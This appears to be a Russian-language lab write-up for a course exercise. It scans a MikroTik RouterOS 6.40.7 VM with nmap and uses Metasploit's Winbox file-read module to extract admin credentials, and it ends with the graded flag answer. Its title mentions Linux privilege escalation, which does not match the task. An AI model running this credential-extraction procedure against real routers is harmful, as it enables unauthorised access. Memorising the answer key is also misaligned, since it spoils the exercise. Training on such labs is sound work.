# Уровень 4. Практика
## Практика «Повышение привилегий на серверных системах в Linux» 

## 🎯 Задание
Проанализировать защищенность узла MikroTik, определить версию ПО и обнаружить известные уязвимости. Проэксплуатировать уязвимость с помощью фреймворка **Metasploit** для извлечения учетных данных администратора.

**Цель:** найти пароль учетной записи администратора, который использовался до текущего пароля (в формате 9 символов).

---

## 🛠 Шаг 1. Инструменты
Всё необходимое для решения:
1. **Stepik** — для сдачи флага.
2. **Mikrotik.ova** — образ виртуальной машины.
3. **VirtualBox** — гипервизор для запуска ОС.
4. **Metasploit Framework** — фреймворк для эксплуатации уязвимостей.
5. **Nmap** — сканер сетевой безопасности.
6. **Терминал** — для управления командами.

---

## 🚀 Шаг 2. Запуск стенда
1. Импортируйте образ `Mikrotik.ova` в Oracle VirtualBox.
2. Запустите виртуальную машину. При первом входе используйте логин `admin` и пароль `password`.
3. После входа проверьте сетевой адрес устройства:
   ```bash
   ip address print
   ```
   Убедитесь, что устройство получило IP-адрес (например, `10.8.0.14`).

---

## 🔍 Шаг 3. Разведка и поиск уязвимости
Проведем сканирование для идентификации версии прошивки MikroTik RouterOS.

1. **Сканирование сети:**
   ```bash
   nmap -sT -Pn -n -F -sV --open 10.8.0.14
   ```
   > **Разбор синтаксиса:**
   > * `-sT` — TCP connect сканирование.
   > * `-Pn` — считать, что хост включен (пропуск ping-теста).
   > * `-n` — отключить DNS-резолвинг (ускоряет работу).
   > * `-F` — быстрый режим (сканирование топ-100 портов).
   > * `-sV` — определение версий сервисов на открытых портах.

2. Анализ вывода показывает версию прошивки: **MikroTik RouterOS 6.40.7**.
3. Запускаем **Metasploit**:
   ```bash
   msfconsole
   ```
4. Ищем эксплойты для MikroTik:
   ```bash
   search Mikrotik
   ```
   Нам нужен модуль `auxiliary/gather/mikrotik_winbox_fileread`, который позволяет читать произвольные файлы через уязвимость в Winbox.

5. Выбираем модуль и изучаем его параметры:
   ```bash
   use auxiliary/gather/mikrotik_winbox_fileread
   info
   ```
   Убеждаемся, что версия уязвимости соответствует нашей (6.30.1–6.40.7).

---

## 🏆 Шаг 4. Захват флага
Приступаем к эксплуатации уязвимости для выгрузки учетных данных.

1. Настраиваем цель (RHOST — Remote Host):
   ```bash
   set RHOSTS 10.8.0.14
   ```
2. Запускаем выполнение модуля:
   ```bash
   run
   ```

Metasploit прочитает системные файлы конфигурации и отобразит пароли пользователей MikroTik. Среди них находим старый пароль администратора.

**Найденный флаг:** `P@sSw0rd!`

**Ответ для Stepik:** `P@sSw0rd!`
